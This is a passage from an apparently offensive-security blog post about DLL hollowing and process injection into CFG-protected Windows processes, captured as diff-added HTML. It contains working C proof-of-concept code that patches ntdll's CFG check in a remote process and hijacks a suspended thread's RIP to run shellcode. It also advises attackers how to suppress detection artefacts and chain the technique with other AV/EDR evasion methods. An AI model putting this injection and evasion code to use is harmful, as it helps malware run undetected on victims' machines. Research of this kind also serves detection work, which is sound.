permissions and then overwrite the bitmap. However, the bitmap is stored into a protected memory area and the call to <code>NtProtectVirtualMemory</code> will fail with <code>NTSTATUS 0xC0000045 STATUS_INVALID_PAGE_PROTECTION</code>.<br></li><li data-block-key="fo0hq">We cannot use the sacrificial DLL’s allowed addresses as the OS would not perform all the steps required to allow a legitimate DLL to be executed. The sacrificial DLL is not actually loaded in the process but it is just mapped into the process address space. This means that, even if we load a CFG-Enabled DLL, the CFG bitmap will not be updated and thus we won’t be able to use the DLL’s allowed offsets to execute our code.<br></li></ul><p data-block-key="1gdmc">We could write to allowed addresses that are already in the CFG bitmap but this will likely crash the target process as we will probably overwrite code that is needed. There are some known techniques that use ROP-like exploitation to achieve code execution by executing certain gadgets already in the binary that would result in a valid jump destination. However, implementing those techniques in a reliable way is complicated and strongly dependent on the target process. Our goal is to find a way that would allow us to successfully inject and execute code regardless of the process we are injecting into.</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h3 data-block-key="50dv2"><br>Disabling CFG by patching the target process’ <code>ntdll!LdrpDispatchUserCallTarget</code></h3><p data-block-key="2fcs9">One hacky trick that we could use is to patch the CFG check function, namely <code>ntdll!LdrpDispatchUserCallTarget</code>, so that it will always allow the execution of our code. To do so, we can edit NTDLL in the target process by applying a 4 bytes micro-patch. In this case, however, we must be very careful because we are manipulating NTDLL used in the target process and we have to take into account concurrency issues because we are editing instructions that might be executed while we are editing it.</p><p data-block-key="9h9np">In this section, we are going to show how to patch CFG. However, we will focus only on the patch itself without considering all the concurrency issues that might emerge while exploiting this technique.</p><p data-block-key="a6eqe">To understand what (and how) we have to patch we need to analyse deeper how CFG checks if a target is valid.</p><p data-block-key="610q">We set a breakpoint on <code>ntdll!LdrpDispatchUserCallTarget</code>.</p><p data-block-key="4iru3">NB: We got the function address with <i>Windbg</i> as <i>x64dbg</i> did not recognise the symbol automatically</p><p data-block-key="2a5mi"></p><img alt="ntdll!LdrpDispatchUserCallTarget disassembled in x64dbg" class="richtext-image full-width" height="177" src="https://www.secforce.com/media/images/patch_ntdllLdrpDispatchUserCallTarget_-_x64dbg.width-800.png" width="800"><p data-block-key="bsfck"></p><p data-block-key="7joq">The bitmap lookup is done by the instruction:</p><p data-block-key="clq6g"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>mov r11, qword ptr ds:[r11 + r10*8]
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="50dv2">while the actual check is done by the instruction:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>bt r11,r10
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="50dv2"><code>The bt instruction “selects the bit in a bit string (specified with the first operand, called the bit base) at the bit-position designated by the bit offset (specified by the second operand) and stores the value of the bit in the CF flag.” (</code><a href="https://www.felixcloutier.com/x86/bt"><code>source</code></a><code>).</code></p><p data-block-key="dqbl8">Since a valid target should have the corresponding bit set to 1, we just need a way to set the carry flag to 1 before the conditional jump executes.</p><p data-block-key="a3v7r">To set the carry flag to 1 we can use the stc instruction (opcode <code>0xf9</code>) (<a href="https://www.felixcloutier.com/x86/stc">source</a>). After the patch is applied, the next instruction (<code>jae ntdll.something</code>) will never take the jump and we will achieve code execution as the program will execute <code>jmp rax</code> ( <code>rax</code> contains the address of the shellcode!).</p><p data-block-key="263ha">We set the micro-patch as:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span>stc
+nop
+nop
+nop
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="50dv2"></p><img alt="patch ntdll!LdrpDispatchUserCallTarget in x64dbg" class="richtext-image full-width" height="181" src="https://www.secforce.com/media/images/patch_ntdllLdrpDispatchUserCallTarget_-_x64dbg.width-800_j5kftCr.png" width="800"><p data-block-key="727qq"></p><p data-block-key="1jil1">And we indeed reach <code>jmp rax</code></p><p data-block-key="e9t1"></p><img alt="patch ntdll!LdrpDispatchUserCallTarget in x64dbg - reaching jmp rax" class="richtext-image full-width" height="209" src="https://www.secforce.com/media/images/patch_ntdllLdrpDispatchUserCallTarget_-_x64dbg.width-800_ScajHQT.png" width="800"><p data-block-key="2er1f"></p><p data-block-key="58ci9">effectively executing our shellcode!</p><p data-block-key="cjufn"></p><img alt="patch ntdll!LdrpDispatchUserCallTarget in x64dbg - payload executed" class="richtext-image full-width" height="585" src="https://www.secforce.com/media/images/patch_ntdllLdrpDispatchUserCallTarget_-_x64dbg.width-800_ND3nO0u.png" width="800"><p data-block-key="c0tbs"></p><p data-block-key="1opuk">The following code is a PoC to patch the CFG bitmap check by searching the pattern to patch in memory:</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="nf">patchCFG</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hProcess</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">	</span><span class="kt">int</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">	</span><span class="n">NTSTATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0</span><span class="p">;</span>
+<span class="w">	</span><span class="n">DWORD</span><span class="w"> </span><span class="n">oldProtect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">	</span><span class="n">PVOID</span><span class="w"> </span><span class="n">pLdrpDispatchUserCallTarget</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="n">PVOID</span><span class="w"> </span><span class="n">pRtlRetrieveNtUserPfn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="n">PVOID</span><span class="w"> </span><span class="n">check_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">	</span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">4</span><span class="p">;</span>
+<span class="w">	</span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">bytesWritten</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">	</span><span class="c1">// stc ; nop ; nop ; nop</span>
+<span class="w">	</span><span class="kt">char</span><span class="w"> </span><span class="n">patch_bytes</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mh">0xf9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="w"> </span><span class="p">};</span>
+
+<span class="w">	</span><span class="c1">// get ntdll!LdrpDispatchUserCallTarget</span>
+<span class="w">	</span><span class="c1">// pLdrpDispatchUserCallTarget = GetProcAddress(GetModuleHandleA("ntdll"), "LdrpDispatchUserCallTarget");</span>
+<span class="w">	</span><span class="c1">// ntdll!LdrpDispatchUserCallTarget cannot be retrieved using GetProcAddress()</span>
+<span class="w">	</span><span class="c1">// we search it near ntdll!RtlRetrieveNtUserPfn </span>
+<span class="w">	</span><span class="c1">// on Windows 10 1909  ntdll!RtlRetrieveNtUserPfn + 0x4f0 = ntdll!LdrpDispatchUserCallTarget</span>
+<span class="w">	</span><span class="n">pRtlRetrieveNtUserPfn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll"</span><span class="p">),</span><span class="w"> </span><span class="s">"RtlRetrieveNtUserPfn"</span><span class="p">);;</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pRtlRetrieveNtUserPfn</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
+<span class="w">	</span><span class="p">{</span>
+<span class="w">		</span><span class="n">printf</span><span class="p">(</span><span class="s">"RtlRetrieveNtUserPfn not found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"RtlRetrieveNtUserPfn @ 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">pRtlRetrieveNtUserPfn</span><span class="p">);</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"Searching ntdll!LdrpDispatchUserCallTarget</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">	</span><span class="c1">// search pattern to find ntdll!LdrpDispatchUserCallTarget</span>
+<span class="w">	</span><span class="kt">char</span><span class="w"> </span><span class="n">pattern</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mh">0x4C</span><span class="w"> </span><span class="p">,</span><span class="mh">0x8B</span><span class="w"> </span><span class="p">,</span><span class="mh">0x1D</span><span class="w"> </span><span class="p">,</span><span class="mh">0xE9</span><span class="w"> </span><span class="p">,</span><span class="mh">0xD7</span><span class="w"> </span><span class="p">,</span><span class="mh">0x0E</span><span class="w"> </span><span class="p">,</span><span class="mh">0x00</span><span class="w"> </span><span class="p">,</span><span class="mh">0x4C</span><span class="w"> </span><span class="p">,</span><span class="mh">0x8B</span><span class="w"> </span><span class="p">,</span><span class="mh">0xD0</span><span class="w"> </span><span class="p">};</span>
+
+<span class="w">	</span><span class="c1">// Windows 10 1909</span>
+<span class="w">	</span><span class="c1">//pRtlRetrieveNtUserPfn = (char*)pRtlRetrieveNtUserPfn + 0x4f0;</span>
+
+<span class="w">	</span><span class="c1">// 0xfff should be enough to find the pattern</span>
+<span class="w">	</span><span class="n">pLdrpDispatchUserCallTarget</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getPattern</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">pattern</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">pRtlRetrieveNtUserPfn</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfff</span><span class="p">);</span>
+<span class="w">	</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pLdrpDispatchUserCallTarget</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span>
+<span class="w">	</span><span class="p">{</span>
+<span class="w">		</span><span class="n">printf</span><span class="p">(</span><span class="s">"LdrpDispatchUserCallTarget not found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"Searching instructions to patch...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+<span class="w">	</span><span class="c1">// we want to overwrite the instruction `bt r11, r10`</span>
+<span class="w">	</span><span class="kt">char</span><span class="w"> </span><span class="n">instr_to_patch</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mh">0x4D</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0F</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD3</span><span class="w"> </span><span class="p">};</span>
+<span class="w">	</span>
+<span class="w">	</span><span class="c1">// offset of the instruction is  0x1d (29)</span>
+<span class="w">	</span><span class="c1">//check_address = (BYTE*)pLdrpDispatchUserCallTarget + 0x1d;</span>
+<span class="w">	</span>
+<span class="w">	</span><span class="c1">// Use getPattern to  find the right instruction</span>
+<span class="w">	</span><span class="n">check_address</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getPattern</span><span class="p">(</span><span class="n">instr_to_patch</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">instr_to_patch</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">pLdrpDispatchUserCallTarget</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfff</span><span class="p">);</span>
+
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"Setting 0x%p to RW</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">check_address</span><span class="p">);</span>
+
+<span class="w">	</span><span class="n">PVOID</span><span class="w"> </span><span class="n">text</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">check_address</span><span class="p">;</span>
+<span class="w">	</span><span class="n">SIZE_T</span><span class="w"> </span><span class="n">text_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">patch_bytes</span><span class="p">);</span>
+
+<span class="w">	</span><span class="c1">// set RW</span>
+<span class="w">	</span><span class="c1">// NB: this might crash the process in case a thread tries to execute those instructions while it is RW</span>
+<span class="w">	</span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtProtectVirtualMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">text_size</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_READWRITE</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span>
+<span class="w">	</span><span class="p">{</span>
+<span class="w">		</span><span class="c1">//printf("Error in NtProtectVirtualMemory : 0x%x", status);</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="c1">// PATCH</span>
+<span class="w">	</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">check_address</span><span class="p">,</span><span class="w"> </span><span class="n">patch_bytes</span><span class="p">,</span><span class="w"> </span><span class="n">size</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">);</span>
+<span class="w">	</span><span class="c1">//memcpy(check_address, patch_bytes, size);</span>
+
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bytesWritten</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">size</span><span class="p">)</span>
+<span class="w">	</span><span class="p">{</span>
+<span class="w">		</span><span class="c1">//printf("Error in WriteProcessMemory!\n");</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="c1">// restore</span>
+<span class="w">	</span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NtProtectVirtualMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">text</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">text_size</span><span class="p">,</span><span class="w"> </span><span class="n">oldProtect</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldProtect</span><span class="p">);</span>
+<span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span>
+<span class="w">	</span><span class="p">{</span>
+<span class="w">		</span><span class="n">printf</span><span class="p">(</span><span class="s">"Error in NtProtectVirtualMemory : 0x%x"</span><span class="p">,</span><span class="w"> </span><span class="n">status</span><span class="p">);</span>
+<span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+<span class="w">	</span><span class="p">}</span>
+
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"Memory restored to RX</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"CFG Patched!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">	</span><span class="n">printf</span><span class="p">(</span><span class="s">"Written %d bytes @ 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">bytesWritten</span><span class="p">,</span><span class="w"> </span><span class="n">check_address</span><span class="p">);</span>
+
+<span class="w">	</span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h3 data-block-key="50dv2">Bypassing CFG by manipulating the thread context</h3><p data-block-key="dm7ct">Another feasible (and simpler) solution would be to overwrite the thread context before the new created thread actually runs. To do so, we create a thread in suspended state and we overwrite the thread context changing the value of the RIP register so as to force the thread to directly execute our shellcode without performing the CFG checks.</p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		<div class="code syntax"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="nf">SetThreadCTX</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">pRemoteCode</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">CONTEXT</span><span class="w"> </span><span class="n">ctx</span><span class="p">;</span>
+
+<span class="w">   </span><span class="c1">// execute the payload by overwriting RIP in the thread of target process</span>
+<span class="w">   </span><span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CONTEXT_FULL</span><span class="p">;</span>
+<span class="w">   </span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+<span class="w">   </span><span class="n">ctx</span><span class="p">.</span><span class="n">Rip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">pRemoteCode</span><span class="p">;</span>
+<span class="w">   </span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ctx</span><span class="p">);</span>
+
+<span class="w">   </span><span class="k">return</span><span class="w"> </span><span class="n">ResumeThread</span><span class="p">(</span><span class="n">hThread</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<p data-block-key="50dv2">Doing this allows us to bypass all the CFG sanity checks because the thread will not start from the CFG check function but will be forced to start at our shellcode address. It also makes it possible to load arbitrary modules into the remote process and execute code starting from any address.</p><p data-block-key="7c3ja">Using <code>LoadLibrary</code> to load the sacrificial DLL:</p><p data-block-key="59m7r"></p><img alt="threadCTX bypass - payload &quot;allocated&quot; with Loadlibrary executed" class="richtext-image full-width" height="268" src="https://www.secforce.com/media/images/threadCTX_-_Loadlibrary_exec.width-800.png" width="800"><p data-block-key="dp9tm"></p><p data-block-key="9ijap">Using <code>NtMapViewOfSections</code> to load the sacrificial DLL:</p><p data-block-key="d9ucc"></p><img alt="threadCTX bypass - payload allocated with NtMapViewOfSection executed" class="richtext-image full-width" height="263" src="https://www.secforce.com/media/images/threadCTX_-_NtMapViewOfSection_exec.width-800.png" width="800"><p data-block-key="bss0a"></p><p data-block-key="6fm78"></p>
+
+	</section>
+	
+	<section class="section-content container section-post-content text-editor-content">	
+		
+<h2 data-block-key="50dv2">Conclusions</h2><p data-block-key="5bml7">In this blog post we analysed how we can inject into a process using the <i>DLL Hollow</i> memory allocation method and in particular the <i>Module Overloading</i> variant. We showed the advantages of this technique as well as the artifacts left in memory which could assist in the detection of this technique.</p><p data-block-key="d5rt9">To summarise:</p><p data-block-key="chdmq"><b>Advantages</b></p><ul><li data-block-key="3rgi0">The payload will be stored in a legitimate DLL mapped in the process address space.<br></li><li data-block-key="fvlio">The memory storing the payload will be marked as <i>Image</i> and it is not distinguishable (in terms of external characteristics, i.e. metadata) from other DLLs.<br></li></ul><p data-block-key="7v7f"><b>Detection</b></p><ul><li data-block-key="ekqoq">The sacrificial DLL will not be in the list of loaded modules.<br></li><li data-block-key="89d1g">The memory of the process will contain inconsistences between the sacrificial DLL in RAM and on Disk<br><ul><li data-block-key="acisn">If the payload is written at the beginning of the sacrificial DLL, we will overwrite the PE headers of the sacrificial DLL.<br></li><li data-block-key="2e3do">Section protections mismatch<br></li><li data-block-key="827eg">Section content mismatch<br></li></ul></li></ul><p data-block-key="cb2fo">We can address 3/4 IOCs by adding extra steps to the injection:</p><ul><li data-block-key="61dt6">Add the sacrificial DLL to the list of loaded modules after mapping the image in the process.<br></li><li data-block-key="4cf6l">Choose wisely a sacrificial DLL such that it has a <i>RX</i> section that is big enough to store the shellcode (and write the shellcode there). In this way we address:<br><ul><li data-block-key="ca75p">PE headers mismatch<br></li><li data-block-key="aj54i">Section protections mismatch<br></li></ul></li></ul><p data-block-key="4cikm">We also analysed the pitfalls to take into account when the technique is used to inject into a remote process, focusing in particular on CFG-Enabled binaries.</p><p data-block-key="967la">Allocating memory using this technique brings some OPSEC advantages and could help our payloads to stay under the radar. However, this is not the golden technique that allows us to bypass every AV/EDR. This technique is a “tool” that should be used in combination with other evasion techniques (e.g. payload encryption, direct system calls, unhooking, etc.) that would address other aspects of the malware detection process.</p><p data-block-key="6336p">Moreover, <i>minifilter</i> drivers could catch different events triggered by this technique that might lead to detection (<a href="https://www.fortinet.com/blog/threat-research/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad">this</a> article, as well as <a href="http://blog.deniable.org/posts/windows-callbacks/">this one</a> provide more information):</p><ul><li data-block-key="gcnn">Image loaded into a process (e.g. <code>NtMapViewOfSection</code> [Depending on the <code>Protect</code> parameter ( <code>AllocationAttributes</code> parameter as per MS docs) of <code>NtCreateSection</code> – <a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga">passing SEC_IMAGE_NO_EXECUTE won’t invoke driver callbacks</a>], <code>LoadLibrary</code>, <code>LoadLibraryEx</code> [Depending on the <code>dwFlags</code> parameter] - <a href="https://www.fortinet.com/blog/threat-research/windows-pssetloadimagenotifyroutine-callbacks-the-good-the-bad">source</a>) could be caught by registering a callback using the API <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetloadimagenotifyroutine">PsSetLoadImageNotifyRoutine</a> .<br></li><li data-block-key="3f6l6">Thread creation can be identified by registering a callback using the API <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine">PsSetCreateThreadNotifyRoutine</a> (<a href="http://blog.deniable.org/posts/windows-callbacks/">source</a>).<br></li></ul><p data-block-key="e3stv">Those events might trigger a red flag if correlated: e.g. a new DLL is loaded in the process -&gt; [ <code>WriteProcessMemory</code> API is hooked (thus, the AV has visibility over the parameters of the call) ] -&gt; a new thread is created, starting from an address in that memory region.</p><p data-block-key="48ckb">This means that we, as attackers, need to tune the behaviour of our malware by combining different techniques and being aware of the details that might be used to detect and/or block the malicious payload.</p><p data-block-key="1dn15">For example, it would be possible to avoid creating a new remote thread and to trigger the execution by tricking the remote process into executing the code itself, which is considered safer by many AV engines (e.g. <a href="https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection">hijacking a thread's APC queue</a> to execute <code>CreateThread</code>). However, those kind of techniques will not allow us to easily manipulate the thread context to bypass CFG and thus we would need to use another technique to bypass it (e.g. patch NTDLL).</p><p data-block-key="802dl">Another interesting approach could be to split the injection into two phases so that memory allocation and thread creation will be executed in different steps, with a reasonable time interval between them to avoid correlation (I took this idea from twitter but unfortunately I cannot find the original tweet anymore for the credits). This analysis is not in the scope of this blog post and we won’t go further into those scenarios.</p><p data-block-key="ect5u">Finally, we will be releasing a <a href="https://github.com/SECFORCE/DLL-Hollow-PoC">PoC in GitHub</a> demonstrating the ideas described in this post. The project can be easily imported into Visual Studio and contains different build configurations that allows you to play with the details we highlighted in this blog post.</p>
+
+	</section>
+	
+	
+	<!-- POST SHARE -->
+	<section class="post-share">
+		<div class="section-inner container">
+			<div class="share-wrapper">
+				<div class="share-label"><h3>Share on</h3></div>
+				<div class="share-icons">
+					<div class="share-icon"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/"><img src="https://www.secforce.com/assets/img/post/share-linkedin.svg" alt="" width="300" height="150"></a></div>
+					<div class="share-icon"><a href="https://twitter.com/intent/tweet?url=https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/"><img src="https://www.secforce.com/assets/img/post/share-twitter.svg" alt="" width="300" height="150"></a></div>
+					<div class="share-icon"><a href="https://www.facebook.com/sharer.php?u=https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/"><img src="https://www.secforce.com/assets/img/post/share-facebook.svg" alt="" width="300" height="150"></a></div>
+				</div>
+			</div>
+		</div>
+	</section>
+	
+ 
+	<!-- RELATED -->
+	<section class="post-related">
+		<div class="section-inner container">
+			<div class="section-title">
+				<h3 class="align-left">You may also be interested in...</h3>
+			</div>
+			<div class="row two-columns">
+				<div class="column">
+					<div class="column-inner">
+						<div class="grid-item lab-item">
+						<div class="grid-item-inner">
+							<div class="thumb">
+								<a href="https://www.secforce.com/blog/cve-2022-20942-its-not-old-functionality-its-vintage/"><img alt="CVE-2022-20942" height="1392" src="https://www.secforce.com/media/images/MicrosoftTeams-image.original.png" width="2185"></a>
+							</div>
+							<div class="meta-info">
+								<div class="meta-date">Dec. 13, 2022</div>
+							</div>
+							<h3 class="title"><a href="https://www.secforce.com/blog/cve-2022-20942-its-not-old-functionality-its-vintage/">CVE-2022-20942: It's not old functionality, it's vintage</a></h3>
+							<p class="excerpt">Cisco information disclosure vulnerability leveraging supposedly removed legacy functionality</p>
+							<a href="https://www.secforce.com/blog/cve-2022-20942-its-not-old-functionality-its-vintage/" class="more-link">See more</a>
+						</div>
+					</div>
+					</div>
+				</div>
+
+				<div class="column">
+					<div class="column-inner">
+						<div class="grid-item lab-item">
+						<div class="grid-item-inner">
+							<div class="thumb">
+								<a href="https://www.secforce.com/blog/why-penetration-test-is-firewall-not-enough/"><img alt="imagensecforcepost.png" height="1392" src="https://www.secforce.com/media/images/imagensecforcepost.original.png" width="2184"></a>
+							</div>
+							<div class="meta-info">
+								<div class="meta-date">Dec. 9, 2008</div>
+							</div>
+							<h3 class="title"><a href="https://www.secforce.com/blog/why-penetration-test-is-firewall-not-enough/">Why penetration test? Is firewall not enough?</a></h3>
+							<p class="excerpt">A few days ago someone visited our website after searching in Google “why penetration test? firewall is not secure enough?”. We are going to dedicate this post just to that topic.</p>
+							<a href="https://www.secforce.com/blog/why-penetration-test-is-firewall-not-enough/" class="more-link">See more</a>
+						</div>
+					</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+
+</div>
+
+
+
+    
+    <!-- JS FILES -->
+    <!-- LIBS -->
+    
+    
+    
+    
+
+    <!-- SITE -->
+    
+    
+        
+
+    <!-- LINKEDIN -->
+    
+
+    <!-- END LINKEDIN -->
+
+    
+    
+
+
+    <!-- LIGHTBOX OK -->
+
+    <div id="box-ok" class="lightbox-wrapper">
+        <div id="box-ok-overlay" class="overlay-bg"></div>
+        <div class="lightbox-container">
+            <div class="lightbox-inner">
+                 <div class="casestudy-download-form textcolor-white">
+                    <p id="mybox-large-text" class="h2 align-center">Thank you!</p>
+                    <div class="form-title h4 align-center">All done, my friend. The information reached SECFORCE goblins safely.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- LIGHTBOX ERROR -->
+    <div id="box-error" class="lightbox-wrapper">
+        <div id="box-error-overlay" class="overlay-bg"></div>
+        <div class="lightbox-container">
+            <div class="lightbox-inner">
+                 <div class="casestudy-download-form textcolor-white">
+                    <p id="mybox-large-text" class="h2 align-center">Please try again later.</p>
+                    <div class="form-title h4 align-center">Oops... Something went wrong. Please check that the form fields are correct.</div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    
+
+
+</body></html>
